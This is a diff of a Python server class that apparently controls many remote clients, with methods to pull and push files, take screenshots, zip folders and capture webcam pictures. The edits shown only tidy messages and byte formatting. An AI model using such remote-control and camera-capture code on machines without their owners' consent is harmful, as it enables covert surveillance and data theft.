@@ -203,7 +203,7 @@ class Server:
                     while not data.endswith(self.connection.END_MARKER):
                         data.extend(connection.recv(self.connection.PACKET_SIZE))
                         len_data_current = len(data)
-                        self.update_line(f"\r[*] {round(len_data_current / (len_data_total / 100), 1)}% complete [{self.format_byte_length(len_data_current)} / {self.format_byte_length(len_data_total)}] complete")
+                        self.update_line(f"\r[*] {round(len_data_current / (len_data_total / 100), 1)}% [{self.format_byte_length(len_data_current)} / {self.format_byte_length(len_data_total)}] complete")
                     data = base64.b64decode(data[:-(len(self.connection.END_MARKER))])
                     try:
                         with open(path_to_save, "wb") as file:
@@ -212,8 +212,6 @@ class Server:
                         print("[-] PermissionError")
             except socket.error as error:
                 self.update_line(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
-            except KeyboardInterrupt:
-                self.update_line("\r[*] download canceled")
             print()
 
     def upload_file(self, path_to_open, path_to_save, connections):
@@ -243,9 +241,6 @@ class Server:
 
                 except socket.error as error:
                     self.update_line(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
-                except KeyboardInterrupt:
-                    # TODO test
-                    self.update_line("\r[*] upload canceled")
                 print()
 
     def make_screenshot(self, monitor, path_to_save, connections):
@@ -262,7 +257,7 @@ class Server:
                     print(f"[-] {response['error']}")
 
             except socket.error as error:
-                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}\n")
+                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
 
     def zip_file_or_folder(self, path_to_open, path_to_save, connections):
         request = {"cmd": "z",
@@ -279,7 +274,7 @@ class Server:
                     print(f"[-] {response['error']}")
 
             except socket.error as error:
-                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}\n")
+                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
 
     def capture_camera_picture(self, path_to_save, connections):
         request = {"cmd": "w",
@@ -296,7 +291,7 @@ class Server:
 
             except socket.error as error:
                 # TODO test
-                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}\n")
+                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
 
     def get_conn_fgoi(self, objects):  # get connections from groups and/or indices
         connections = list()
@@ -328,9 +323,9 @@ class Server:
     def format_byte_length(self, num, suffix='B'):
         for unit in ['', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi']:
             if abs(num) < 1024.0:
-                return "%3.1f%s%s" % (num, unit, suffix)
+                return f"{num:3.1f} {unit}{suffix}"
             num /= 1024.0
-        return "%.1f%s%s" % (num, 'Yi', suffix)
+        return f"{num:3.1f} Yi{suffix}"
 
 
 class Connection:
